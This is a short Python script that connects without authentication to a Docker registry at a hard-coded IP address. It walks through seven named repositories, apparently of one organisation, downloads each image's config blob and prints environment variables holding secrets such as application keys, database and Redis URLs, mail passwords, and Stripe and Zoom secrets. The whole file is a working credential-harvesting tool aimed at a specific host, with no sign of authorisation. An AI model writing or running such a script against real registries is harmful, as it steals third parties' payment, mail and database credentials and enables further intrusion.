import urllib.request, json, sys

base = 'http://192.46.220.113:5000'
repos = [
    'apeirogon/awa/awa-reports',
    'apeirogon/general/angkham-advisory',
    'apeirogon/general/apeirogon-site',
    'apeirogon/general/synergy-wholesale-management-portal.git',
    'apeirogon/general/ploi-audit',
    'apeirogon/general/laravel-key-generator',
    'aiftismemberes',
]

def get_json(url, headers={}):
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read())

for repo in repos:
    try:
        tags_data = get_json(f'{base}/v2/{repo}/tags/list')
        tag = tags_data.get('tags', [None])[0]
        if not tag:
            print(f'[{repo}] no tags'); continue
        m = get_json(f'{base}/v2/{repo}/manifests/{tag}',
            {'Accept': 'application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.docker.distribution.manifest.v2+json'})
        if m.get('manifests'):
            ad = next((x['digest'] for x in m['manifests'] if x.get('platform',{}).get('architecture')=='amd64'), m['manifests'][0]['digest'])
            m = get_json(f'{base}/v2/{repo}/manifests/{ad}',
                {'Accept': 'application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json'})
        cfg = m.get('config', {}).get('digest')
        if not cfg:
            print(f'[{repo}] no config digest'); continue
        blob = get_json(f'{base}/v2/{repo}/blobs/{cfg}')
        env = blob.get('config', {}).get('Env', [])
        print(f'\n=== {repo} ({len(env)} vars) ===')
        for e in env:
            if any(k in e for k in ['APP_NAME=','APP_URL=','APP_KEY=','DB_URL=','REDIS_URL=',
                                      'MAIL_PASSWORD=','MAILGUN_SECRET=','STRIPE_SECRET=',
                                      'TILL_API','ZOOM_CLIENT_SECRET=','ZOOM_ACCOUNT']):
                print(f'  {e[:140]}')
    except Exception as ex:
        print(f'[{repo}] ERROR: {ex}')
